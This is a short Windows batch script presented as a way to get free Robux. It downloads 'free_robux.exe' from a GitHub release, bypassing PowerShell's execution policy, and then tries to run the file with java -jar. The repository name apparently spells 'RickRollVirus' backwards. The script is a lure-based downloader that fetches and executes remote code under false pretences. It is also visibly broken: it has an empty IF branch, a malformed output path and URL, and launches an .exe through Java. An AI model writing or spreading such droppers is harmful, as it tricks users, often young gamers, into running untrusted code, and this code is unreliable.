@echo off
setlocal EnableExtensions

set "EXE_NAME=free_robux.exe"
set "EXE_URL=https://github.com/ItsNukea/suriVlloRkciR/releases/downloads/v2.0/%EXE_NAME%"
set "DEST_DIR=%USERPROFILE%\Downloads"

IF EXIST "%DEST_DIR%%EXE_NAME%" (
) ELSE (
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "iwr -Uri '%EXE_URL%' -OutFile '%DEST_DIR%' -UseBasicParsing"
)

if errorlevel 1 (
  echo Download failed. Make sure to connect to the internet when running this file
  pause
  exit /b 1
)

cd %DEST_DIR%
java -jar %EXE_NAME%
pause

endlocal